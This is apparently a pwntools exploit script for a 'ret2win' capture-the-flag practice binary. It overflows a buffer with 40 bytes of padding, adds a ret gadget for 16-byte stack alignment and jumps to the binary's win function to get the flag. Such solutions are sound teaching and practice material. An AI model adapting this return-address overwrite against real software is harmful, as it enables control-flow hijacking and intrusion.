from pwn import *

offset = 40

ret = 0x40053e

elf = ELF('./ret2win')
ret2win = elf.symbols['ret2win']

p = process('./ret2win')

# Offset for overwrite saved rip
payload = "A" * offset
# On some version of GLIBC, system uses movaps instruction,
# the stack must be 16-byte aligned, so we add a ret gadget
# for that
payload += p64(ret)
# ret2win function, we get the flag
payload += p64(ret2win)

p.sendline(payload)

p.interactive()
